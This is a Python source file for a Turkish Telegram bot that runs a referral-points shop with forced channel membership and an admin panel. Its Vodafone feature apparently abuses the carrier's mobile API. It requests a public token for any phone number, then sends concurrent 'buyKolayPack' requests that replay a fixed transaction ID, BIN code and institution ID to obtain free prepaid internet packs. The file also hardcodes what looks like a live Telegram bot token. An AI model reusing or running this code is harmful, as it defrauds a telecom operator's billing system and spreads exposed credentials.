import random
import time
import requests
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask
import telebot
from telebot import types

# ---------------------------------------------------------
# RENDER 7/24 KEEP-ALIVE WEB SUNUCUSU
# ---------------------------------------------------------
app = Flask('')

@app.route('/')
def home():
    return "Bot Render Üzerinde 7/24 Aktif!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# Web sunucusunu bot başlatılmadan hemen önce çalıştır
keep_alive()

# ---------------------------------------------------------
# BOT VE SİSTEM BİLGİLERİ
# ---------------------------------------------------------
TOKEN = "8839384581:AAFMEArYZUHFMYjAsprEEwenMwu9Z7_9Hj0"
ADMIN_ID = 6734911869
KURUCU_LINK = "https://t.me/kirvelerinkrali"

# Zorunlu Kanallar
CHANNELS = [
    {"name": "Kanal", "url": "https://t.me/denizdosya", "id": -1003261861393},
    {"name": "Chat", "url": "https://t.me/+D91FStmBTKlhYTJh", "id": -1002659528621},
    {"name": "Kanal", "url": "https://t.me/+gomrSmjprWExNGNk", "id": -1004441335180},
    {"name": "Chat", "url": "https://t.me/bedavayetis", "id": -1003970351228}
]

bot = telebot.TeleBot(TOKEN)

# Veri Depoları
users = {}            
promo_codes = {}      
user_states = {}      
orders_db = {}
order_counter = 1

# Mağaza Ürünleri
shop_items = {
    1: {"name": "Gri Kapak", "price": 3, "stock": True},
    2: {"name": "Şerit", "price": 6, "stock": False},
    3: {"name": "Vodafone Faturasız İnternet", "price": 1, "stock": True}
}

# ---------------------------------------------------------
# LENINVF VODAFONE ENTEGRASYONU
# ---------------------------------------------------------
DEVICES = [
    {"platform": "Android", "user_agent": "Mozilla/5.0 (Linux; Android 11; SM-G991B) Chrome/138.0.7204.179 Mobile Safari/537.36"},
    {"platform": "Android", "user_agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) Chrome/138.0.7204.179 Mobile Safari/537.36"}
]

BASE_URL = "https://m.vodafone.com.tr/maltgtwaycbu/api"
FIX_TRANSACTION_ID = "DADBA38725DE9A09CA8156C8CB3E7B4E6444C4A28A3A32BD1A57FB2CCAE86EC828E33B0FE97883D68B187C693BF20A6BE8942A5BE87FE782986A33996B3A7A7775F1C59BA76CB5ADB18C5DE099D65FDF41C1E5C90E8B7D8DE26F5C2FC6276DFF3A46402ACED5B38AEB692430DE2A6234BBEA5A48"
FIX_REASON_CODE = "13239"
FIX_BIN_CODE = "979239"
FIX_PROMOTION_ID = "0"
FIX_INSTITUTION_ID = "2871"
FIX_IDENTIFIER = "/Prepaid/KolayPack/KP_INTEGRATED_OFFER_20"

def clean_msisdn(msisdn: str) -> str:
    msisdn = msisdn.strip().replace("+90", "")
    if msisdn.startswith("0"):
        msisdn = msisdn[1:]
    msisdn = ''.join(filter(str.isdigit, msisdn))
    if len(msisdn) != 10:
        raise ValueError("Numara 10 haneli olmalıdır.")
    return msisdn

def get_public_token(msisdn: str):
    dev = random.choice(DEVICES)
    headers = {
        "Host": "m.vodafone.com.tr",
        "User-Agent": dev["user_agent"],
        "sec-ch-ua-platform": dev["platform"],
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.vodafone.com.tr"
    }
    url = f"{BASE_URL}?method=getPublicToken&msisdn={msisdn}&type=3"
    try:
        resp = requests.post(url, headers=headers, timeout=10)
        data = resp.json()
        if data.get("result", {}).get("result") == "SUCCESS":
            return data.get("publicToken")
    except:
        pass
    return None

def buy_kolay_pack(token: str, msisdn: str):
    dev = random.choice(DEVICES)
    headers = {
        "Host": "m.vodafone.com.tr",
        "User-Agent": dev["user_agent"],
        "sec-ch-ua-platform": dev["platform"],
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.vodafone.com.tr"
    }
    url = (
        f"{BASE_URL}?method=buyKolayPack"
        f"&publicToken={token}&transactionId={FIX_TRANSACTION_ID}"
        f"&reasonCode={FIX_REASON_CODE}&operationType=MP&isContractApproved=true"
        f"&binCode={FIX_BIN_CODE}&promotionId={FIX_PROMOTION_ID}"
        f"&msisdn={msisdn}&institutionId={FIX_INSTITUTION_ID}"
        f"&identifier={FIX_IDENTIFIER}"
    )
    try:
        resp = requests.post(url, headers=headers, timeout=10)
        return resp.json()
    except Exception as e:
        return {"error": str(e), "result": {"result": "EXCEPTION"}}

def process_vodafone(msisdn: str, thread_cnt: int = 3):
    token = get_public_token(msisdn)
    if not token:
        return False, "Token alınamadı!"
    
    results = []
    with ThreadPoolExecutor(max_workers=thread_cnt) as executor:
        futures = [executor.submit(buy_kolay_pack, token, msisdn) for _ in range(thread_cnt)]
        for f in as_completed(futures):
            results.append(f.result())
            
    success = sum(1 for r in results if r.get("result", {}).get("result") == "SUCCESS")
    if success > 0:
        return True, f"İşlem Başarılı! ({success}/{thread_cnt} paket yüklendi)"
    return False, "Sipariş işlenirken hata oluştu."

# ---------------------------------------------------------
# YARDIMCI FONKSİYONLAR
# ---------------------------------------------------------
def register_user(user, ref_id=None):
    uid = user.id
    if uid not in users:
        users[uid] = {
            "name": user.first_name or "Kullanıcı",
            "username": (user.username or "Yok").lower(),
            "points": 0,
            "refs": 0,
            "orders": [],
            "last_bonus": 0
        }
        if ref_id and str(ref_id).isdigit():
            ref_uid = int(ref_id)
            if ref_uid in users and ref_uid != uid:
                users[ref_uid]["points"] += 1
                users[ref_uid]["refs"] += 1
                try:
                    bot.send_message(ref_uid, "🎉 Yeni bir referans katıldı! **+1 Puan** kazandınız.", parse_mode="Markdown")
                except:
                    pass
    else:
        users[uid]["username"] = (user.username or "Yok").lower()
        users[uid]["name"] = user.first_name or "Kullanıcı"

def check_sub(user_id):
    for ch in CHANNELS:
        if ch["id"]:
            try:
                member = bot.get_chat_member(ch["id"], user_id)
                if member.status in ['left', 'kicked']:
                    return False
            except Exception:
                return False
    return True

def get_sub_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 {ch['name']}", url=ch["url"]))
    markup.add(types.InlineKeyboardButton("✅ Katıldım / Kontrol Et", callback_data="check_subscription"))
    return markup

def get_main_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("💎 Bakiye Kas (Ref)", callback_data="btn_ref_kas")
    btn2 = types.InlineKeyboardButton("👤 Profilim", callback_data="btn_profil")
    btn3 = types.InlineKeyboardButton("🛒 Mağaza", callback_data="btn_magaza")
    btn4 = types.InlineKeyboardButton("⭐ VIP Mağaza", callback_data="btn_vip_magaza")
    btn5 = types.InlineKeyboardButton("👑 VIP Ol · Yıldızla Satın Al", callback_data="btn_vip_al")
    btn6 = types.InlineKeyboardButton("💎 Günlük Bonus", callback_data="btn_bonus")
    btn7 = types.InlineKeyboardButton("⬆️ Siparişlerim", callback_data="btn_siparisler")
    btn8 = types.InlineKeyboardButton("💸 Puan Transferi", callback_data="btn_transfer")
    btn9 = types.InlineKeyboardButton("🎫 Kupon Kodu", callback_data="btn_kupon")
    btn10 = types.InlineKeyboardButton("🔗 Referans", callback_data="btn_ref_kas")
    btn11 = types.InlineKeyboardButton("💬 Destek", callback_data="btn_destek")
    btn12 = types.InlineKeyboardButton("🕊️ Yardım", callback_data="btn_yardim")
    btn13 = types.InlineKeyboardButton("📱 VF İnternet", callback_data="btn_vodafone")
    
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5)
    markup.add(btn6, btn7)
    markup.add(btn8, btn9)
    markup.add(btn10, btn11)
    markup.add(btn12, btn13)
    
    if user_id == ADMIN_ID:
        btn_admin = types.InlineKeyboardButton("👑 Admin Paneli", callback_data="btn_admin_panel")
        markup.add(btn_admin)
        
    return markup

def get_back_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⬅️ Geri", callback_data="menu_ana"))
    return markup

# ---------------------------------------------------------
# START VE ANA KOMUTLAR
# ---------------------------------------------------------
@bot.message_handler(commands=['start'])
def start_cmd(message):
    args = message.text.split()
    ref_id = args[1] if len(args) > 1 else None
    
    register_user(message.from_user, ref_id)
    user_states.pop(message.from_user.id, None)

    if not check_sub(message.from_user.id):
        text = "⚠️ **Botu kullanabilmek için zorunlu kanallara katılmalısınız:**"
        bot.send_message(message.chat.id, text, reply_markup=get_sub_keyboard(), parse_mode="Markdown")
        return

    welcome_text = (
        f"👋 **Hoşgeldiniz {message.from_user.first_name}!**\n\n"
        "👑 Bu Bot 𝑫𝒆𝒏𝒊𝒛 𝑨𝒌𝒔𝒐𝒚 Tarafından Yapılmıştır."
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(message.from_user.id), parse_mode="Markdown")

# ---------------------------------------------------------
# CALLBACK İŞLEYİCİ
# ---------------------------------------------------------
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global order_counter
    uid = call.from_user.id
    register_user(call.from_user)

    if call.data == "check_subscription":
        if check_sub(uid):
            bot.answer_callback_query(call.id, "✅ Kanallara katıldığınız doğrulandı!")
            bot.edit_message_text(
                f"👋 **Hoşgeldiniz {call.from_user.first_name}!**\n\n👑 Bu Bot 𝑫𝒆𝒏𝒊𝒛 𝑨𝒌𝒔𝒐𝒚 Tarafından Yapılmıştır.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=get_main_keyboard(uid),
                parse_mode="Markdown"
            )
        else:
            bot.answer_callback_query(call.id, "❌ Henüz kanallara katılmadınız!", show_alert=True)
        return

    if not check_sub(uid):
        bot.answer_callback_query(call.id, "⚠️ Lütfen önce zorunlu kanallara katılın!", show_alert=True)
        return

    if call.data == "menu_ana":
        user_states.pop(uid, None)
        bot.edit_message_text("Ana menüye dönüldü:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_main_keyboard(uid))

    elif call.data == "btn_admin_panel":
        if uid != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Bu alanı sadece admin kullanabilir!", show_alert=True)
            return
            
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("➕ Promo Kod", callback_data="adm_action_promo"),
            types.InlineKeyboardButton("➕ Ürün Ekle", callback_data="adm_action_add_item"),
            types.InlineKeyboardButton("🗑 Ürün Sil", callback_data="adm_action_del_item"),
            types.InlineKeyboardButton("➕ Puan Ver", callback_data="adm_action_add_pts"),
            types.InlineKeyboardButton("📢 Duyuru Gönder", callback_data="adm_action_broadcast"),
            types.InlineKeyboardButton("👥 Kullanıcılar", callback_data="adm_action_users"),
            types.InlineKeyboardButton("⬅️ Geri", callback_data="menu_ana")
        )
        bot.edit_message_text("👑 **ADMİN PANELİ**\n\nYapmak istediğiniz işlemi seçin:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "adm_action_promo" and uid == ADMIN_ID:
        user_states[uid] = "WAITING_ADM_PROMO"
        bot.send_message(ADMIN_ID, "🔑 **Promo Kod:** Kod, Puan ve Limit miktarını yazın.\n\nÖrnek: `Deniz54 10 5`", parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "adm_action_add_item" and uid == ADMIN_ID:
        user_states[uid] = "WAITING_ADM_ADD_ITEM"
        bot.send_message(ADMIN_ID, "➕ **Ürün Ekle:** Fiyat ve Ürün İsmini yazın.\n\nÖrnek: `4 Netflix`", parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "adm_action_del_item" and uid == ADMIN_ID:
        user_states[uid] = "WAITING_ADM_DEL_ITEM"
        txt = "🗑 **Ürün Sil:** Silmek istediğiniz ürünün ID'sini yazın.\n\n"
        for i_id, i_data in shop_items.items():
            txt += f"ID: `{i_id}` | {i_data['name']}\n"
        bot.send_message(ADMIN_ID, txt, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "adm_action_add_pts" and uid == ADMIN_ID:
        user_states[uid] = "WAITING_ADM_ADD_PTS"
        bot.send_message(ADMIN_ID, "➕ **Puan Ver:** Kullanıcı ID ve Miktar yazın.\n\nÖrnek: `6734911869 10`", parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "adm_action_broadcast" and uid == ADMIN_ID:
        user_states[uid] = "WAITING_ADM_BROADCAST"
        bot.send_message(ADMIN_ID, "📢 **Duyuru:** Göndermek istediğiniz mesajı yazın.", parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "adm_action_users" and uid == ADMIN_ID:
        txt = f"👥 **Toplam Kullanıcı:** {len(users)}\n\n"
        for u_id, u_data in list(users.items())[:20]:
            txt += f"• `{u_id}` - @{u_data['username']} ({u_data['points']} Puan)\n"
        bot.send_message(ADMIN_ID, txt, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data.startswith("ord_deliv_") and uid == ADMIN_ID:
        o_id = int(call.data.split("_")[2])
        ord_info = orders_db.get(o_id)
        if ord_info:
            user_states[ADMIN_ID] = f"WAITING_DELIVERY_CONTENT_{o_id}"
            bot.send_message(
                ADMIN_ID, 
                f"📦 **Sipariş Teslimatı (# {o_id})**\n\nKullanıcıya gönderilecek ürün içeriğini (kod, hesap vb.) yazıp mesaj olarak atın:", 
                parse_mode="Markdown"
            )

    elif call.data.startswith("ord_cancel_") and uid == ADMIN_ID:
        o_id = int(call.data.split("_")[2])
        ord_info = orders_db.get(o_id)
        if ord_info:
            c_id = ord_info["user_id"]
            p_name = ord_info["item_name"]
            price = ord_info["price"]
            
            if c_id in users:
                users[c_id]["points"] += price
                if p_name in users[c_id]["orders"]:
                    users[c_id]["orders"].remove(p_name)
                    
            bot.edit_message_text(f"❌ **SİPARİŞ İPTAL EDİLDİ (Puan İade Edildi)**\n\nSipariş ID: #{o_id}\nÜrün: {p_name}\nKullanıcı ID: `{c_id}`", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown")
            try:
                bot.send_message(c_id, f"❌ **Siparişiniz İptal Edildi!**\n\nÜrün: **{p_name}**\nHarcanan **{price} Puan** hesabınıza iade edildi.", parse_mode="Markdown")
            except:
                pass

    elif call.data == "btn_profil":
        u = users[uid]
        bot_username = bot.get_me().username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        prof_text = (
            f"👤 **Profil**\n\n"
            f"**İsim:** {u['name']}\n"
            f"**ID:** `{uid}`\n"
            f"**Kullanıcı adı:** @{u['username']}\n"
            f"**Puan:** {u['points']}\n"
            f"**Referans:** {u['refs']}\n\n"
            f"🔗 **Referans linkin:**\n`{ref_link}`"
        )
        bot.edit_message_text(prof_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data in ["btn_ref_kas", "btn_ref"]:
        bot_username = bot.get_me().username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        text = f"🔗 **REFERANS SİSTEMİ**\n\nHer referans için **1 Puan** kazanırsın!\n\nDavet Linkin:\n`{ref_link}`"
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "btn_magaza":
        markup = types.InlineKeyboardMarkup(row_width=1)
        for item_id, item in shop_items.items():
            stock_str = "" if item["stock"] else " (Stok Yok)"
            btn_txt = f"{item['name']} - {item['price']} Puan{stock_str}"
            markup.add(types.InlineKeyboardButton(btn_txt, callback_data=f"buy_item_{item_id}"))
        markup.add(types.InlineKeyboardButton("⬅️ Geri", callback_data="menu_ana"))
        bot.edit_message_text("🛒 **MAĞAZA**\n\nSatın almak istediğiniz ürünü seçin:", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data.startswith("buy_item_"):
        item_id = int(call.data.split("_")[2])
        item = shop_items.get(item_id)
        if not item:
            bot.answer_callback_query(call.id, "❌ Ürün bulunamadı!", show_alert=True)
            return
        if not item["stock"]:
            bot.answer_callback_query(call.id, "❌ Bu ürünün stoğu kalmadı!", show_alert=True)
            return
            
        if users[uid]["points"] < item["price"]:
            bot.answer_callback_query(call.id, f"❌ Yetersiz Bakiye! Gereken: {item['price']} Puan", show_alert=True)
        else:
            users[uid]["points"] -= item["price"]
            users[uid]["orders"].append(item["name"])
            bot.answer_callback_query(call.id, "✅ Satın alım siparişi alındı!", show_alert=True)
            bot.send_message(call.message.chat.id, f"🎉 **{item['name']}** siparişiniz alındı! Admin onayından sonra tarafınıza teslim edilecektir.", parse_mode="Markdown")
            
            o_id = order_counter
            order_counter += 1
            orders_db[o_id] = {"user_id": uid, "item_name": item["name"], "price": item["price"]}
            
            adm_markup = types.InlineKeyboardMarkup(row_width=2)
            adm_markup.add(
                types.InlineKeyboardButton("📦 Ürünü Gönder", callback_data=f"ord_deliv_{o_id}"),
                types.InlineKeyboardButton("❌ İptal Et", callback_data=f"ord_cancel_{o_id}")
            )
            
            bot.send_message(
                ADMIN_ID, 
                f"🛒 **YENİ SİPARİŞ GELİŞİ!**\n\nSipariş ID: #{o_id}\nKullanıcı: @{users[uid]['username']}\nKullanıcı ID: `{uid}`\nÜrün: **{item['name']}**\nÜcret: {item['price']} Puan", 
                reply_markup=adm_markup, 
                parse_mode="Markdown"
            )

    elif call.data == "btn_bonus":
        now = time.time()
        last = users[uid]["last_bonus"]
        if now - last < 86400:
            kalan_saat = int((86400 - (now - last)) // 3600)
            bot.answer_callback_query(call.id, f"⏳ Günlük bonusu aldınız! Kalan süre: ~{kalan_saat} saat.", show_alert=True)
        else:
            bonus = random.choice([1, 2])
            users[uid]["points"] += bonus
            users[uid]["last_bonus"] = now
            bot.answer_callback_query(call.id, f"🎉 Günlük Bonus! +{bonus} Puan eklendi.", show_alert=True)

    elif call.data == "btn_siparisler":
        orders = users[uid]["orders"]
        if not orders:
            text = "⬆️ **Siparişlerim**\n\nHenüz hiç sipariş vermediniz."
        else:
            text = "⬆️ **Sipariş Geçmişiniz:**\n\n" + "\n".join([f"• {o}" for o in orders])
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "btn_transfer":
        user_states[uid] = "WAITING_TRANSFER_DATA"
        text = "💸 **Puan Transferi**\n\nKullanıcı adı ve miktarı yazın (Min: 5 Puan):\nÖrnek: `@kullaniciadi 5`"
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "btn_kupon":
        user_states[uid] = "WAITING_PROMO_CODE"
        bot.edit_message_text("🎫 **Kupon Kodu**\n\nPromosyon kodunuzu yazın:", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "btn_destek":
        user_states[uid] = "WAITING_COMPLAINT"
        bot.edit_message_text("💬 **Destek / Şikayet**\n\nŞikayetiniz Nedir? Lütfen yazın:", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

    elif call.data == "btn_yardim":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("👑 Kurucu", url=KURUCU_LINK))
        markup.add(types.InlineKeyboardButton("⬅️ Geri", callback_data="menu_ana"))
        bot.edit_message_text("🕊️ **Yardım Paneli**", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "btn_vodafone":
        if users[uid]["points"] < 1:
            bot.answer_callback_query(call.id, "❌ Yetersiz Puan! En az 1 Puan gerekli.", show_alert=True)
            return
        user_states[uid] = "WAITING_VODAFONE_NUM"
        bot.edit_message_text("📱 **Vodafone İnternet**\n\n10 haneli telefon numaranızı girin:", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=get_back_keyboard())

# ---------------------------------------------------------
# METİN YANIT DÖNGÜSÜ
# ---------------------------------------------------------
@bot.message_handler(func=lambda msg: True)
def handle_text_messages(message):
    uid = message.from_user.id
    state = user_states.get(uid)

    if not state:
        return

    if isinstance(state, str) and state.startswith("WAITING_DELIVERY_CONTENT_") and uid == ADMIN_ID:
        o_id = int(state.split("_")[3])
        ord_info = orders_db.get(o_id)
        if ord_info:
            c_id = ord_info["user_id"]
            p_name = ord_info["item_name"]
            delivery_text = message.text
            
            try:
                msg_to_user = (
                    f"🎉 **Siparişiniz Teslim Edildi!**\n\n"
                    f"📦 **Ürün:** {p_name}\n"
                    f"🔑 **Teslimat İçeriği:**\n{delivery_text}\n\n"
                    f"Bizi tercih ettiğiniz için teşekkür ederiz!"
                )
                bot.send_message(c_id, msg_to_user, parse_mode="Markdown")
                bot.send_message(ADMIN_ID, f"✅ **#{o_id}** numaralı sipariş başarıyla teslim edildi ve kullanıcıya iletildi.")
            except Exception as e:
                bot.send_message(ADMIN_ID, f"❌ Kullanıcıya mesaj gönderilemedi: {e}")
        user_states.pop(uid, None)

    elif state == "WAITING_ADM_PROMO" and uid == ADMIN_ID:
        try:
            parts = message.text.split()
            c_name, c_pts, c_uses = parts[0], int(parts[1]), int(parts[2])
            promo_codes[c_name] = {"points": c_pts, "uses_left": c_uses, "used_users": []}
            bot.send_message(ADMIN_ID, f"✅ **Promo Kod Oluşturuldu!**\nKod: `{c_name}`\nPuan: {c_pts}\nLimit: {c_uses}", parse_mode="Markdown")
        except:
            bot.send_message(ADMIN_ID, "❌ Hatalı format! Örnek: `Deniz54 10 5`")
        user_states.pop(uid, None)

    elif state == "WAITING_ADM_ADD_ITEM" and uid == ADMIN_ID:
        try:
            parts = message.text.split(maxsplit=1)
            price = int(parts[0])
            name = parts[1]
            new_id = max(shop_items.keys(), default=0) + 1
            shop_items[new_id] = {"name": name, "price": price, "stock": True}
            bot.send_message(ADMIN_ID, f"✅ **Ürün Eklendi!**\nID: {new_id}\nİsim: {name}\nFiyat: {price} Puan", parse_mode="Markdown")
        except:
            bot.send_message(ADMIN_ID, "❌ Hatalı format! Örnek: `4 Netflix`")
        user_states.pop(uid, None)

    elif state == "WAITING_ADM_DEL_ITEM" and uid == ADMIN_ID:
        try:
            item_id = int(message.text.strip())
            if item_id in shop_items:
                del shop_items[item_id]
                bot.send_message(ADMIN_ID, f"✅ ID `{item_id}` olan ürün mağazadan silindi.", parse_mode="Markdown")
            else:
                bot.send_message(ADMIN_ID, "❌ Ürün bulunamadı.")
        except:
            bot.send_message(ADMIN_ID, "❌ Geçersiz ID.")
        user_states.pop(uid, None)

    elif state == "WAITING_ADM_ADD_PTS" and uid == ADMIN_ID:
        try:
            parts = message.text.split()
            target_id, pts = int(parts[0]), int(parts[1])
            if target_id in users:
                users[target_id]["points"] += pts
                bot.send_message(ADMIN_ID, f"✅ `{target_id}` hesabına **+{pts} Puan** eklendi.", parse_mode="Markdown")
            else:
                bot.send_message(ADMIN_ID, "❌ Kullanıcı bulunamadı.")
        except:
            bot.send_message(ADMIN_ID, "❌ Örnek: `6734911869 10`")
        user_states.pop(uid, None)

    elif state == "WAITING_ADM_BROADCAST" and uid == ADMIN_ID:
        count = 0
        for u_id in users:
            try:
                bot.send_message(u_id, f"📢 **DUYURU:**\n\n{message.text}", parse_mode="Markdown")
                count += 1
            except:
                pass
        bot.send_message(ADMIN_ID, f"✅ Duyuru **{count}** kişiye gönderildi.")
        user_states.pop(uid, None)

    elif state == "WAITING_TRANSFER_DATA":
        try:
            parts = message.text.split()
            target_username = parts[0].replace("@", "").lower()
            amount = int(parts[1])
            if amount < 5 or users[uid]["points"] < amount:
                bot.send_message(message.chat.id, "❌ Yetersiz bakiye veya geçersiz miktar (Min 5).")
                return

            target_id = next((u_id for u_id, u_data in users.items() if u_data["username"] == target_username), None)
            if target_id:
                users[uid]["points"] -= amount
                users[target_id]["points"] += amount
                bot.send_message(message.chat.id, f"✅ @{target_username} kullanıcısına **{amount} Puan** aktarıldı!")
            else:
                bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
        except:
            bot.send_message(message.chat.id, "❌ Örnek format: `@kullanici 5`")
        user_states.pop(uid, None)

    elif state == "WAITING_PROMO_CODE":
        code = message.text.strip()
        if code in promo_codes:
            data = promo_codes[code]
            if uid in data["used_users"] or data["uses_left"] <= 0:
                bot.send_message(message.chat.id, "❌ Geçersiz veya kullanılmış kod!")
            else:
                data["uses_left"] -= 1
                data["used_users"].append(uid)
                users[uid]["points"] += data["points"]
                bot.send_message(message.chat.id, f"🎉 Kupon başarıyla kullanıldı: **+{data['points']} Puan**")
        else:
            bot.send_message(message.chat.id, "❌ Kod bulunamadı.")
        user_states.pop(uid, None)

    elif state == "WAITING_COMPLAINT":
        bot.send_message(message.chat.id, "✅ Şikayetiniz kurucuya iletildi.")
        try:
            bot.send_message(ADMIN_ID, f"⚠️ **YENİ ŞİKAYET!**\n👤 ID: `{uid}`\n💬 Mesaj: {message.text}", parse_mode="Markdown")
        except:
            pass
        user_states.pop(uid, None)

    elif state == "WAITING_VODAFONE_NUM":
        try:
            num = clean_msisdn(message.text)
            users[uid]["points"] -= 1
            bot.send_message(message.chat.id, "⚡ İşlem başlatıldı...")
            success, info = process_vodafone(num)
            if success:
                users[uid]["orders"].append(f"Vodafone ({num})")
                bot.send_message(message.chat.id, f"✅ {info}")
            else:
                users[uid]["points"] += 1
                bot.send_message(message.chat.id, f"❌ {info} (Puan iade edildi)")
        except ValueError as e:
            bot.send_message(message.chat.id, f"❌ Hata: {e}")
        user_states.pop(uid, None)

if __name__ == "__main__":
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
